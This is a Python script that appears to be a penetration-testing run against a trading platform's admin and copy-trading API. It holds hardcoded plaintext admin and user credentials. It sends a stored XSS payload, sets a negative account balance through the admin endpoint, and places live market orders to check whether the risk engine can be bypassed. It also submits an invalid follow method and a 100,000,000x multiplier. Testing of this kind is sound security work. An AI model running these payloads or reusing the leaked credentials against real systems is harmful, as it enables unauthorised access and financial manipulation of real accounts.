import requests
import json
import time

BASE_URL = "https://lpadmin.blackfx.com"
ADMIN_EMAIL = "lpadmin@blacktrader.com"
ADMIN_PASSWORD = "Raj1234!"
MASTER_EMAIL = "mamm@mailinator.com"
MASTER_PASSWORD = "12345678"
FOLLOWER_EMAIL = "mamf1@mailinator.com"
FOLLOWER_PASSWORD = "12345678"

# 1. Login Admin
adm_s = requests.Session()
r_adm = adm_s.post(f"{BASE_URL}/admin/api/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "remember": True}, timeout=10)
admin_token = r_adm.json().get("token")
admin_headers = {"Authorization": f"Bearer {admin_token}", "Content-Type": "application/json"}

# 2. Login Master & Follower
m_s = requests.Session()
r_m_login = m_s.post(f"{BASE_URL}/api/auth/login", json={"email": MASTER_EMAIL, "password": MASTER_PASSWORD}, timeout=10)
master_client_id = r_m_login.json().get("trader", {}).get("member_id") or "mem_11434b0b9d9d210899"
r_m_tok = m_s.post(f"{BASE_URL}/api/auth/chart-token", timeout=10)
master_token = r_m_tok.json().get("token")
master_headers = {"Authorization": f"Bearer {master_token}", "Content-Type": "application/json"}

f_s = requests.Session()
r_f_login = f_s.post(f"{BASE_URL}/api/auth/login", json={"email": FOLLOWER_EMAIL, "password": FOLLOWER_PASSWORD}, timeout=10)
follower_client_id = r_f_login.json().get("trader", {}).get("member_id") or "mem_0ea679062ffd38adf7"
r_f_tok = f_s.post(f"{BASE_URL}/api/auth/chart-token", timeout=10)
follower_token = r_f_tok.json().get("token")
follower_headers = {"Authorization": f"Bearer {follower_token}", "Content-Type": "application/json"}

print(f"Logged in: Admin={bool(admin_token)}, Master={master_client_id}, Follower={follower_client_id}")

results = []

def test(name, method, url, headers, payload=None):
    print(f"\n==========================================")
    print(f"TEST: {name}")
    print(f"URL: {method} {url}")
    if payload:
        print(f"PAYLOAD: {json.dumps(payload)}")
    try:
        r = requests.request(method, url, headers=headers, json=payload, timeout=12)
        print(f"STATUS: {r.status_code}")
        print(f"BODY: {r.text[:500]}")
        results.append({
            "name": name,
            "method": method,
            "url": url,
            "payload": payload,
            "status": r.status_code,
            "response": r.text
        })
        return r
    except Exception as e:
        print(f"ERROR: {e}")
        return None

# Probe 1: Stored XSS / Unsanitized HTML in Master display_name
r_xss = test(
    "Stored XSS / HTML Injection in Master display_name",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/master",
    master_headers,
    payload={
        "share_percent": 50.0,
        "display_name": "<script>alert('XSS_MAM')</script><img src=x onerror=alert(1)>"
    }
)

# Fetch master details to see if raw HTML/XSS was saved verbatim
r_fetch_master = m_s.get(f"{BASE_URL}/v1/oms/real/mam/follows", headers=master_headers)
print("Fetched master info after XSS injection:", r_fetch_master.json().get("master"))

# Clean up master display_name
m_s.post(f"{BASE_URL}/v1/oms/real/mam/master", headers=master_headers, json={"share_percent": 50.0, "display_name": "mamm"})

# Probe 2: Negative Balance Order Placement (Risk Engine Bypass)
# Set follower balance to -$10,000
adm_s.post(f"{BASE_URL}/admin/api/members/{follower_client_id}/balance", headers=admin_headers, json={"instance": "real", "balance": -10000.0})
r_f_funds = f_s.get(f"{BASE_URL}/v1/oms/real/funds", headers=follower_headers)
print(f"Follower balance set to negative: {r_f_funds.json().get('funds', {}).get('balance')}")

# Now follower attempts to place an order directly with negative balance
r_neg_order = test(
    "Order Placement with Negative Account Balance",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders",
    follower_headers,
    payload={"symbol": "BINANCE:BTCUSDT", "side": "BUY", "type": "MARKET", "qty": 0.01}
)

# Probe 3: What if Master places an order while Follower has negative balance?
# Does the MAM engine replicate a live trade to an account that has negative balance?
r_m_order = m_s.post(f"{BASE_URL}/v1/oms/real/orders", headers=master_headers, json={
    "symbol": "BINANCE:BTCUSDT", "side": "BUY", "type": "MARKET", "qty": 0.01
})
print("Master order placed:", r_m_order.status_code, r_m_order.text[:200])
m_mkt_id = r_m_order.json().get("order", {}).get("market_order_id")

time.sleep(1)
# Check follower positions
r_f_pos = f_s.get(f"{BASE_URL}/v1/oms/real/positions", headers=follower_headers)
print(f"Follower positions count while in negative balance: {len(r_f_pos.json().get('positions', []))}")
results.append({
    "name": "MAM Replication to Account with Negative Balance",
    "status": 200,
    "follower_balance": -10000.0,
    "replicated_positions_count": len(r_f_pos.json().get("positions", [])),
    "follower_positions": r_f_pos.json().get("positions", [])
})

# Cleanup master order & follower balance
if m_mkt_id:
    m_s.post(f"{BASE_URL}/v1/oms/real/positions/{m_mkt_id}/squareoff", headers=master_headers)
# Also square off any follower position if opened
for p in r_f_pos.json().get("positions", []):
    f_s.post(f"{BASE_URL}/v1/oms/real/positions/{p.get('market_order_id')}/squareoff", headers=follower_headers)

# Reset follower balance back to 10000000
adm_s.post(f"{BASE_URL}/admin/api/members/{follower_client_id}/balance", headers=admin_headers, json={"instance": "real", "balance": 10000000.0})

# Probe 4: Zero Share Percent in MAM Master (0% Profit Share)
r_zero_share = test(
    "Zero Share Percent in MAM Master (0% Profit Share)",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/master",
    master_headers,
    payload={"share_percent": 0.0, "display_name": "ZeroFeeMaster"}
)

# Reset master settings cleanly back to 50%
m_s.post(f"{BASE_URL}/v1/oms/real/mam/master", headers=master_headers, json={"share_percent": 50.0, "display_name": "mamm"})

# Probe 5: Invalid Method in MAM Follow (e.g. method: "martingale" or "lottery")
r_inv_method = test(
    "Invalid Method in MAM Follow",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/follow",
    follower_headers,
    payload={
        "master_client_id": master_client_id,
        "method": "martingale_hack",
        "multiplier": 1.0,
        "share_percent": 50.0
    }
)

# Probe 6: Extreme Multiplier in MAM Follow (e.g. 100,000,000x multiplier)
r_ext_mult = test(
    "Extreme Multiplier in MAM Follow (100,000,000x)",
    "POST",
    f"{BASE_URL}/v1/oms/real/mam/follow",
    follower_headers,
    payload={
        "master_client_id": master_client_id,
        "method": "multiplier",
        "multiplier": 100000000.0,
        "share_percent": 50.0
    }
)

# Reset follower to normal equity follow
f_s.post(f"{BASE_URL}/v1/oms/real/mam/follow", headers=follower_headers, json={
    "master_client_id": master_client_id, "method": "equity", "multiplier": 1.0, "share_percent": 50.0
})

with open("scratch/complex_bug_results.json", "w") as f:
    json.dump(results, f, indent=2)

print("\n[+] Complex bug probes completed! Saved to scratch/complex_bug_results.json")
